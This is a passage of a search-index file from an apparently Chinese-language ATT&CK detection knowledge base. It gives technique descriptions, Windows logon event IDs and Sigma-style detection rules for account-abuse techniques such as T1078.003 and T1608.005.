6e\u8d44\u6e90\u3002</p> <p>\u901a\u5e38\u60c5\u51b5\u4e0b\uff0c\u94fe\u63a5\u76ee\u6807\u7684\u8d44\u6e90\u5c06\u662f\u4e00\u4e2aHTML\u9875\u9762\uff0c\u53ef\u80fd\u5305\u62ec\u4e00\u4e9b\u5ba2\u6237\u7aef\u811a\u672c\uff0c\u5982JavaScript\uff0c\u4ee5\u53ca\u51b3\u5b9a\u5411\u7528\u6237\u63d0\u4f9b\u4ec0\u4e48\u5185\u5bb9\u3002\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u514b\u9686\u5408\u6cd5\u7f51\u7ad9\u4f5c\u4e3a\u94fe\u63a5\u76ee\u6807\uff0c\u8fd9\u53ef\u80fd\u5305\u62ec\u514b\u9686\u5408\u6cd5\u7f51\u7edc\u670d\u52a1\u7684\u767b\u5f55\u9875\u9762\u6216\u7ec4\u7ec7\u7684\u767b\u5f55\u9875\u9762\uff0c\u5728\u9c7c\u53c9\u5f0f\u7f51\u7edc\u9493\u9c7c\u94fe\u63a5\u671f\u95f4\u83b7\u53d6\u51ed\u636e\u3002</p> <p>\u5728\u83b7\u53d6\u57fa\u7840\u8bbe\u65bd\uff08\u57df\u540d\uff09\u671f\u95f4\uff0c\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u8d2d\u4e70\u4e0e\u5408\u6cd5\u57df\u540d\u76f8\u4f3c\u7684\u57df\u540d\uff08\u4f8b\u5982\uff1a\u540c\u97f3\u5b57\u3001\u9519\u522b\u5b57\u3001\u4e0d\u540c\u7684\u9876\u7ea7\u57df\u540d\u7b49\uff09\uff0c\u4ee5\u5e2e\u52a9\u4fc3\u8fdb\u6076\u610f\u94fe\u63a5\u3002\u4e5f\u53ef\u4ee5\u4f7f\u7528\u77ed\u57df\u540d\u670d\u52a1\u3002</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1608-005-%E9%98%B6%E6%AE%B5%E6%80%A7%E8%83%BD%E5%8A%9B-Link%20Target/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u6682\u65e0</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1608-005-%E9%98%B6%E6%AE%B5%E6%80%A7%E8%83%BD%E5%8A%9B-Link%20Target/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>\u65e0\u6cd5\u6709\u6548\u76d1\u6d4b</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1608-005-%E9%98%B6%E6%AE%B5%E6%80%A7%E8%83%BD%E5%8A%9B-Link%20Target/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>\u65e0</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1608-005-%E9%98%B6%E6%AE%B5%E6%80%A7%E8%83%BD%E5%8A%9B-Link%20Target/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>\u65e0</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1608-005-%E9%98%B6%E6%AE%B5%E6%80%A7%E8%83%BD%E5%8A%9B-Link%20Target/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":"<p>\u65e0</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1608-005-%E9%98%B6%E6%AE%B5%E6%80%A7%E8%83%BD%E5%8A%9B-Link%20Target/#_6","title":"\u5efa\u8bae","text":""},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1608-005-%E9%98%B6%E6%AE%B5%E6%80%A7%E8%83%BD%E5%8A%9B-Link%20Target/#_7","title":"\u7f13\u89e3\u63aa\u65bd","text":"<p>\u8fd9\u79cd\u6280\u672f\u4e0d\u5bb9\u6613\u7528\u9884\u9632\u63a7\u5236\u6765\u7f13\u89e3\uff0c\u56e0\u4e3a\u5b83\u662f\u57fa\u4e8e\u4f01\u4e1a\u9632\u5fa1\u548c\u63a7\u5236\u8303\u56f4\u4e4b\u5916\u7684\u884c\u4e3a\u3002</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1608-005-%E9%98%B6%E6%AE%B5%E6%80%A7%E8%83%BD%E5%8A%9B-Link%20Target/#_8","title":"\u68c0\u6d4b","text":"<p>\u8fd9\u79cd\u6d3b\u52a8\u7684\u5927\u90e8\u5206\u5c06\u53d1\u751f\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u53ef\u89c1\u6027\u4e4b\u5916\uff0c\u56e0\u6b64\u5f88\u96be\u68c0\u6d4b\u5230\u8fd9\u79cd\u884c\u4e3a\u3002\u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u5176\u4ed6\u9636\u6bb5\uff0c\u4f8b\u5982\u5728\u7f51\u7edc\u9493\u9c7c\u94fe\u63a5\u6216\u6076\u610f\u94fe\u63a5\u671f\u95f4\u3002</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1608-005-%E9%98%B6%E6%AE%B5%E6%80%A7%E8%83%BD%E5%8A%9B-Link%20Target/#_9","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1608-005</p> <p>https://attack.mitre.org/techniques/T1608/005/</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1078-003-win-%E5%A4%9A%E8%B4%A6%E6%88%B7%E5%90%8C%E6%97%B6%E7%99%BB%E9%99%86/","title":"T1078-003-windows-\u591a\u8d26\u6237\u540c\u65f6\u767b\u9646","text":""},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1078-003-win-%E5%A4%9A%E8%B4%A6%E6%88%B7%E5%90%8C%E6%97%B6%E7%99%BB%E9%99%86/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u83b7\u53d6\u5e76\u6ee5\u7528\u672c\u5730\u5e10\u6237\u7684\u51ed\u636e\uff0c\u4ee5\u83b7\u53d6\u521d\u59cb\u8bbf\u95ee\u6743\u9650\uff0c\u6301\u4e45\u6027\uff0c\u6743\u9650\u63d0\u5347\u6216\u9632\u5fa1\u9003\u907f\u3002\u672c\u5730\u5e10\u6237\u662f\u7531\u7ec4\u7ec7\u914d\u7f6e\u7684\u5e10\u6237\uff0c\u4f9b\u7528\u6237\uff0c\u8fdc\u7a0b\u652f\u6301\uff0c\u670d\u52a1\u4f7f\u7528\u6216\u5728\u5355\u4e2a\u7cfb\u7edf\u6216\u670d\u52a1\u4e0a\u8fdb\u884c\u7ba1\u7406\u3002</p> <p>\u901a\u8fc7OS\u51ed\u636e\u8f6c\u50a8\uff0c\u672c\u5730\u5e10\u6237\u4e5f\u53ef\u80fd\u88ab\u6ee5\u7528\u4ee5\u63d0\u5347\u7279\u6743\u548c\u6536\u96c6\u51ed\u636e\u3002\u4e3a\u4e86\u7279\u6743\u5347\u7ea7\u548c\u6a2a\u5411\u79fb\u52a8\uff0c\u5bc6\u7801\u91cd\u7528\u53ef\u80fd\u5141\u8bb8\u6ee5\u7528\u7f51\u7edc\u4e0a\u7684\u4e00\u7ec4\u8ba1\u7b97\u673a\u4e0a\u7684\u672c\u5730\u5e10\u6237\u3002</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1078-003-win-%E5%A4%9A%E8%B4%A6%E6%88%B7%E5%90%8C%E6%97%B6%E7%99%BB%E9%99%86/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u591a\u4e2a\u7528\u6237\u540c\u65f6\u6216\u8005\u5728\u540c\u4e00\u5c0f\u65f6\u5185\u767b\u5f55\u5230\u540c\u4e00\u53f0\u8ba1\u7b97\u673a\u4e0a\uff0c\u901a\u5e38\u4e0d\u4f1a\u51fa\u73b0\u5728\u6211\u4eec\u89c2\u5bdf\u5230\u7684\u7f51\u7edc\u4e2d\u3002</p> <p>\u767b\u5f55\u4e8b\u4ef6\u662f\u9002\u7528\u4e8eWindows Vista\u53ca\u66f4\u9ad8\u7248\u672c\u7684Windows\uff0c\u9002\u7528\u4e8eVista\u4e4b\u540e\u7684\u7248\u672c\uff0c\u767b\u9646\u4e8b\u4ef6ID\u4e3a4624\u3002\u9002\u7528\u4e8eVista\u4e4b\u524d\u7684\u7248\u672c\uff0c\u767b\u9646\u4e8b\u4ef6ID\u4e3a528/540\u3002Windows Vista\u53ca\u66f4\u9ad8\u7248\u672c\u7684\u6ce8\u9500\u4e8b\u4ef6ID\u4e3a4634\uff0cVista\u4e4b\u524d\u7684\u6ce8\u9500\u4e8b\u4ef6ID\u4e3a538\u3002\u767b\u5f55\u7c7b\u578b2,3,9\u548c10\u662f\u503c\u5f97\u5173\u6ce8\u7684\u3002\u6709\u5173\u66f4\u591a\u8be6\u7ec6\u4fe1\u606f\uff0c\u8bf7\u53c2\u9605Microsoft\u7684\u201c \u5ba1\u6838\u767b\u5f55\u4e8b\u4ef6\u201d\u9875\u9762\u4e0a\u7684\u201c\u767b\u5f55\u7c7b\u578b\u201d\u8868\u3002</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1078-003-win-%E5%A4%9A%E8%B4%A6%E6%88%B7%E5%90%8C%E6%97%B6%E7%99%BB%E9%99%86/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>windows \u5b89\u5168\u65e5\u5fd7</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1078-003-win-%E5%A4%9A%E8%B4%A6%E6%88%B7%E5%90%8C%E6%97%B6%E7%99%BB%E9%99%86/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>\u6682\u65e0</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1078-003-win-%E5%A4%9A%E8%B4%A6%E6%88%B7%E5%90%8C%E6%97%B6%E7%99%BB%E9%99%86/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>\u5173\u6ce8windows\u767b\u9646\u4e8b\u4ef6\uff0c\u5e76\u7559\u610f\u767b\u9646\u7c7b\u578b\u3002\u9002\u7528\u4e8eVista\u4e4b\u540e\u7684\u7248\u672c\uff0c\u767b\u9646\u4e8b\u4ef6ID\u4e3a4624\uff1b\u9002\u7528\u4e8eVista\u4e4b\u524d\u7684\u7248\u672c\uff0c\u767b\u9646\u4e8b\u4ef6ID\u4e3a528/540\uff1b\u767b\u5f55\u7c7b\u578b2,3,9\u548c10\u662f\u503c\u5f97\u5173\u6ce8\u7684\u3002</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1078-003-win-%E5%A4%9A%E8%B4%A6%E6%88%B7%E5%90%8C%E6%97%B6%E7%99%BB%E9%99%86/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1078-003-win-%E5%A4%9A%E8%B4%A6%E6%88%B7%E5%90%8C%E6%97%B6%E7%99%BB%E9%99%86/#es","title":"es\u89c4\u5219","text":"<p>\u601d\u8def\uff1a\u7edf\u8ba1\u5728\u4e00\u5c0f\u65f6\u5185\uff0c\u540c\u4e00\u53f0\u4e3b\u673a\u4e0a\uff0c\u767b\u9646\u7684\u7528\u6237\u662f\u5426\u5927\u4e8e\u4e00\u4e2a</p> <pre><code>users_list = search UserSession:Login\nusers_grouped = group users_list by hostname\nusers_grouped = from users_grouped select min(time) as earliest_time, max(time) as latest_time count(user) as user_count\nmultiple_logins = filter users_grouped where (latest_time - earliest_time &lt;= 1 hour and user_count &gt; 1)\noutput multiple_logins\n</code></pre>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1078-003-win-%E5%A4%9A%E8%B4%A6%E6%88%B7%E5%90%8C%E6%97%B6%E7%99%BB%E9%99%86/#_6","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1078-003</p> <p>https://attack.mitre.org/techniques/T1078/003/</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1078-003-win-%E6%9D%A5%E8%87%AA%E5%85%AC%E7%BD%91%E7%9A%84%E7%99%BB%E9%99%86%E5%A4%B1%E8%B4%A5%E8%A1%8C%E4%B8%BA/","title":"T1078-003-win-\u6765\u81ea\u516c\u7f51\u7684\u767b\u9646\u5931\u8d25\u884c\u4e3a","text":""},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1078-003-win-%E6%9D%A5%E8%87%AA%E5%85%AC%E7%BD%91%E7%9A%84%E7%99%BB%E9%99%86%E5%A4%B1%E8%B4%A5%E8%A1%8C%E4%B8%BA/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>VPN\u3001Citrix\u7b49\u8fdc\u7a0b\u670d\u52a1\u4ee5\u53ca\u5176\u5b83\u8bbf\u95ee\u673a\u5236\u5141\u8bb8\u7528\u6237\u4ece\u5916\u90e8\u8bbf\u95ee\u4f01\u4e1a\u5185\u90e8\u7f51\u7edc\u8d44\u6e90\u3002\u901a\u5e38\u6709\u8fdc\u7a0b\u670d\u52a1\u7f51\u5173\u6765\u7ba1\u7406\u8fd9\u4e9b\u670d\u52a1\u8fde\u63a5\u548c\u51ed\u636e\u8ba4\u8bc1\u3002Windows\u8fdc\u7a0b\u7ba1\u7406\u7b49\u670d\u52a1\u4e5f\u53ef\u4ee5\u5728\u5916\u90e8\u4f7f\u7528\u3002</p> <p>\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u901a\u8fc7\u8fdc\u7a0b\u670d\u52a1\u6765\u521d\u59cb\u8bbf\u95ee\u7f51\u7edc\u548c/\u6216\u5728\u7f51\u7edc\u4e2d\u505c\u7559\u3002\u901a\u5e38\uff0c\u7528\u6237\u987b\u4f7f\u7528\u6709\u6548\u8d26\u53f7\u624d\u80fd\u8bbf\u95ee\u670d\u52a1\u3002\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u901a\u8fc7\u51ed\u636e\u6b3a\u9a97\u6216\u5165\u4fb5\u4f01\u4e1a\u7f51\u7edc\u4ece\u7528\u6237\u4fa7\u83b7\u53d6\u51ed\u636e\u7684\u65b9\u5f0f\u6765\u83b7\u5f97\u6709\u6548\u8d26\u53f7\u6743\u9650\u3002\u5728\u64cd\u4f5c\u671f\u95f4\uff0c\u5bf9\u8fdc\u7a0b\u670d\u52a1\u7684\u8bbf\u95ee\u53ef\u7528\u4f5c\u5197\u4f59\u8bbf\u95ee\u7684\u4e00\u90e8\u5206\u3002</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1078-003-win-%E6%9D%A5%E8%87%AA%E5%85%AC%E7%BD%91%E7%9A%84%E7%99%BB%E9%99%86%E5%A4%B1%E8%B4%A5%E8%A1%8C%E4%B8%BA/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>windows\u8d26\u6237\u767b\u5f55\u5931\u8d25\u3002</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1078-003-win-%E6%9D%A5%E8%87%AA%E5%85%AC%E7%BD%91%E7%9A%84%E7%99%BB%E9%99%86%E5%A4%B1%E8%B4%A5%E8%A1%8C%E4%B8%BA/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>windows \u5b89\u5168\u65e5\u5fd7</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1078-003-win-%E6%9D%A5%E8%87%AA%E5%85%AC%E7%BD%91%E7%9A%84%E7%99%BB%E9%99%86%E5%A4%B1%E8%B4%A5%E8%A1%8C%E4%B8%BA/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>\u573a\u666f\u8f83\u7b80\u5355\uff0c\u8bf7\u81ea\u884c\u6d4b\u8bd5\u3002</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1078-003-win-%E6%9D%A5%E8%87%AA%E5%85%AC%E7%BD%91%E7%9A%84%E7%99%BB%E9%99%86%E5%A4%B1%E8%B4%A5%E8%A1%8C%E4%B8%BA/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>windows\u5b89\u5168\u4e8b\u4ef6ID\uff08win7/win2008+\uff09</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1078-003-win-%E6%9D%A5%E8%87%AA%E5%85%AC%E7%BD%91%E7%9A%84%E7%99%BB%E9%99%86%E5%A4%B1%E8%B4%A5%E8%A1%8C%E4%B8%BA/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1078-003-win-%E6%9D%A5%E8%87%AA%E5%85%AC%E7%BD%91%E7%9A%84%E7%99%BB%E9%99%86%E5%A4%B1%E8%B4%A5%E8%A1%8C%E4%B8%BA/#sigma","title":"Sigma\u89c4\u5219","text":"<pre><code>title: \u6765\u81ea\u516c\u7f51\u7684\u767b\u9646\u5931\u8d25\u884c\u4e3a\ndescription: \u4ece\u516c\u5171IP\u767b\u5f55\u53ef\u80fd\u8868\u660e\u9632\u706b\u5899\u6216\u7f51\u7edc\u8fb9\u754c\u914d\u7f6e\u9519\u8bef\u3002\nauthor: NVISO  12306Br0(\u7ffb\u8bd1+\u6d4b\u8bd5)\ndate: 2020/05/06\ntags:\n    - attack.initial_access\n    - attack.persistence\n    - attack.t1078\n    - attack.t1190\n    - attack.t1133\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID: 4625 #\u767b\u9646\u5931\u8d25\n    unknown:\n        IpAddress|contains: '-'\n    privatev4:\n        IpAddress|startswith:\n            - '10.' #10.0.0.0/8\n            - '192.168.' #192.168.0.0/16\n            - '172.16.' #172.16.0.0/12\n            - '172.17.'\n            - '172.18.'\n            - '172.19.'\n            - '172.20.'\n            - '172.21.'\n            - '172.22.'\n            - '172.23.'\n            - '172.24.'\n            - '172.25.'\n            - '172.26.'\n            - '172.27.'\n            - '172.28.'\n            - '172.29.'\n            - '172.30.'\n            - '172.31.'\n            - '127.' #127.0.0.0/8\n            - '169.254.' #169.254.0.0/16\n    privatev6:\n        - IpAddress: '::1' #loopback\n        - IpAddress|startswith:\n            - 'fe80::' #link-local\n            - 'fc00::' #unique local\n    condition: selection and not (unknown or privatev4 or privatev6)\nfalsepositives:\n    - \u4e92\u8054\u7f51\u4e0a\u7684\u5408\u6cd5\u767b\u5f55\u5c1d\u8bd5\n    - IPv4\u5230IPv6\u6620\u5c04\u7684IP\nlevel: medium\n</code></pre>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1078-003-win-%E6%9D%A5%E8%87%AA%E5%85%AC%E7%BD%91%E7%9A%84%E7%99%BB%E9%99%86%E5%A4%B1%E8%B4%A5%E8%A1%8C%E4%B8%BA/#_6","title":"\u5efa\u8bae","text":"<p>\u6682\u65e0</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1078-003-win-%E6%9D%A5%E8%87%AA%E5%85%AC%E7%BD%91%E7%9A%84%E7%99%BB%E9%99%86%E5%A4%B1%E8%B4%A5%E8%A1%8C%E4%B8%BA/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1078-003</p> <p>https://attack.mitre.org/techniques/T1078/003/</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1078-003-win-%E8%B4%A6%E6%88%B7%E7%99%BB%E5%BD%95%E5%A4%B1%E8%B4%A5/","title":"T1078-003-win-\u8d26\u6237\u767b\u5f55\u5931\u8d25","text":""},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1078-003-win-%E8%B4%A6%E6%88%B7%E7%99%BB%E5%BD%95%E5%A4%B1%E8%B4%A5/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u4f7f\u7528\u51ed\u636e\u8bbf\u95ee\u6280\u672f\u7a83\u53d6\u7279\u5b9a\u7528\u6237\u6216\u670d\u52a1\u8d26\u53f7\u7684\u51ed\u636e\uff0c\u6216\u8005\u5728\u4fa6\u5bdf\u8fc7\u7a0b\u7684\u65e9\u671f\u901a\u8fc7\u793e\u4f1a\u5de5\u7a0b\u6355\u83b7\u51ed\u636e\u4ee5\u83b7\u5f97\u9996\u6b21\u8bbf\u95ee\u6743\u9650\u3002</p> <p>\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u4e09\u79cd\u8d26\u53f7\uff1a\u9ed8\u8ba4\u8d26\u53f7\u3001\u672c\u5730\u8d26\u53f7\u548c\u57df\u8d26\u53f7\u3002\u9ed8\u8ba4\u8d26\u53f7\u662f\u64cd\u4f5c\u7cfb\u7edf\u7684\u5185\u7f6e\u8d26\u53f7\uff0c\u4f8b\u5982Windows\u7cfb\u7edf\u4e0a\u7684\u8bbf\u5ba2\u6216\u7ba1\u7406\u5458\u8d26\u53f7\uff0c\u6216\u8005\u5176\u4ed6\u7c7b\u578b\u7cfb\u7edf\u3001\u8f6f\u4ef6\u6216\u8bbe\u5907\u4e0a\u7684\u9ed8\u8ba4\u5de5\u5382/\u63d0\u4f9b\u5546\u8d26\u53f7\u3002\u672c\u5730\u8d26\u53f7\u662f\u7ec4\u7ec7\u914d\u7f6e\u7ed9\u7528\u6237\u3001\u8fdc\u7a0b\u652f\u6301\u6216\u670d\u52a1\u7684\u8d26\u53f7\uff0c\u6216\u5355\u4e2a\u7cfb\u7edf/\u670d\u52a1\u7684\u7ba1\u7406\u8d26\u53f7\u3002\u57df\u8d26\u53f7\u662fAD-DS\uff08\u6d3b\u52a8\u76ee\u5f55\u57df\u670d\u52a1\uff09\u7ba1\u7406\u7684\u8d26\u53f7\uff0c\u5176\u8bbf\u95ee\u548c\u6743\u9650\u5728\u57df\u5185\u4e0d\u540c\u7cfb\u7edf\u548c\u670d\u52a1\u4e4b\u95f4\u914d\u7f6e\u3002\u57df\u8d26\u53f7\u53ef\u4ee5\u6db5\u76d6\u7528\u6237\u3001\u7ba1\u7406\u5458\u548c\u670d\u52a1\u3002</p> <p>\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u83b7\u53d6\u5e76\u6ee5\u7528\u672c\u5730\u5e10\u6237\u7684\u51ed\u636e\uff0c\u4ee5\u83b7\u53d6\u521d\u59cb\u8bbf\u95ee\u6743\u9650\uff0c\u6301\u4e45\u6027\uff0c\u6743\u9650\u63d0\u5347\u6216\u9632\u5fa1\u9003\u907f\u3002\u672c\u5730\u5e10\u6237\u662f\u7531\u7ec4\u7ec7\u914d\u7f6e\u7684\u5e10\u6237\uff0c\u4f9b\u7528\u6237\uff0c\u8fdc\u7a0b\u652f\u6301\uff0c\u670d\u52a1\u4f7f\u7528\u6216\u5728\u5355\u4e2a\u7cfb\u7edf\u6216\u670d\u52a1\u4e0a\u8fdb\u884c\u7ba1\u7406\u3002</p> <p>\u901a\u8fc7OS\u51ed\u636e\u8f6c\u50a8\uff0c\u672c\u5730\u5e10\u6237\u4e5f\u53ef\u80fd\u88ab\u6ee5\u7528\u4ee5\u63d0\u5347\u7279\u6743\u548c\u6536\u96c6\u51ed\u636e\u3002\u4e3a\u4e86\u7279\u6743\u5347\u7ea7\u548c\u6a2a\u5411\u79fb\u52a8\uff0c\u5bc6\u7801\u91cd\u7528\u53ef\u80fd\u5141\u8bb8\u6ee5\u7528\u7f51\u7edc\u4e0a\u7684\u4e00\u7ec4\u8ba1\u7b97\u673a\u4e0a\u7684\u672c\u5730\u5e10\u6237\u3002</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1078-003-win-%E8%B4%A6%E6%88%B7%E7%99%BB%E5%BD%95%E5%A4%B1%E8%B4%A5/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>windows\u8d26\u6237\u767b\u5f55\u5931\u8d25\u3002</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1078-003-win-%E8%B4%A6%E6%88%B7%E7%99%BB%E5%BD%95%E5%A4%B1%E8%B4%A5/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>windows \u5b89\u5168\u65e5\u5fd7</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1078-003-win-%E8%B4%A6%E6%88%B7%E7%99%BB%E5%BD%95%E5%A4%B1%E8%B4%A5/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>\u573a\u666f\u8f83\u7b80\u5355\uff0c\u8bf7\u81ea\u884c\u6d4b\u8bd5\u3002</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1078-003-win-%E8%B4%A6%E6%88%B7%E7%99%BB%E5%BD%95%E5%A4%B1%E8%B4%A5/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>windows\u5b89\u5168\u4e8b\u4ef6ID\uff08win7/win2008+\uff09</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1078-003-win-%E8%B4%A6%E6%88%B7%E7%99%BB%E5%BD%95%E5%A4%B1%E8%B4%A5/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1078-003-win-%E8%B4%A6%E6%88%B7%E7%99%BB%E5%BD%95%E5%A4%B1%E8%B4%A5/#sigma","title":"Sigma\u89c4\u5219","text":"<pre><code>title: \u4ece\u5355\u4e00\u6e90\u7cfb\u7edf\u4f7f\u7528\u4e0d\u540c\u5e10\u6237\u767b\u5f55\u5931\u8d25\ndescription: \u4ece\u5355\u4e2a\u6e90\u7cfb\u7edf\u68c0\u6d4b\u4f7f\u7528\u4e0d\u540c\u7528\u6237\u5e10\u6237\u7684\u53ef\u7591\u5931\u8d25\u767b\u5f55\nauthor: 12306Br0\uff08\u7ffb\u8bd1\uff09\ndate: 2020/06/09\ntags:\n    - attack.persistence\n    - attack.privilege_escalation\n    - attack.t1078-003\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection1:\n        EventID:\n            - 529 #windows 2003\n            - 4625 #windows server 2008\u4ee5\u4e0a\n        UserName: '*'  #\u7528\u6237\u540d\n        WorkstationName: '*'  #\u5de5\u4f5c\u7ad9\u540d\n    selection2:\n        EventID: 4776 #\u9002\u7528\u4e8e\u57df\u8d26\u6237\u767b\u5f55\n        UserName: '*' #\u7528\u6237\u540d\n        Workstation: '*' #\u5de5\u4f5c\u7ad9\u540d\n    timeframe: 24h\n    condition:\n        - selection1 | count(UserName) by WorkstationName &gt; 3\n        - selection2 | count(UserName) by Workstation &gt; 3\nfalsepositives:\n    - \u7ec8\u7aef\u670d\u52a1\u5668\n    - \u8df3\u677f\u670d\u52a1\u5668\n    - \u5176\u4ed6\u591a\u7528\u6237\u7cfb\u7edf\uff0c\u4f8b\u5982Citrix\u670d\u52a1\u5668\u573a\n    - \u7528\u6237\u9891\u7e41\u53d8\u5316\u7684\u5de5\u4f5c\u7ad9\nlevel: medium\n</code></pre>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1078-003-win-%E8%B4%A6%E6%88%B7%E7%99%BB%E5%BD%95%E5%A4%B1%E8%B4%A5/#_6","title":"\u5efa\u8bae","text":"<p>\u5efa\u8bae\u6839\u636e\u4e1a\u52a1\u7cfb\u7edf\u5b9e\u9645\u60c5\u51b5\uff0c\u8c03\u6574\u9608\u503c\u3002</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1078-003-win-%E8%B4%A6%E6%88%B7%E7%99%BB%E5%BD%95%E5%A4%B1%E8%B4%A5/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1078-003</p> <p>https://attack.mitre.org/techniques/T1078/003/</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1133-%E5%A4%96%E9%83%A8%E8%BF%9C%E7%A8%8B%E6%9C%8D%E5%8A%A1/","title":"T1133-\u5916\u90e8\u8fdc\u7a0b\u670d\u52a1","text":""},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1133-%E5%A4%96%E9%83%A8%E8%BF%9C%E7%A8%8B%E6%9C%8D%E5%8A%A1/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>VPN\uff0cCitrix\u548c\u5176\u4ed6\u8bbf\u95ee\u673a\u5236\u7b49\u8fdc\u7a0b\u670d\u52a1\u4f7f\u7528\u6237\u53ef\u4ee5\u4ece\u5916\u90e8\u4f4d\u7f6e\u8fde\u63a5\u5230\u5185\u90e8\u4f01\u4e1a\u7f51\u7edc\u8d44\u6e90\u3002\u7ecf\u5e38\u6709\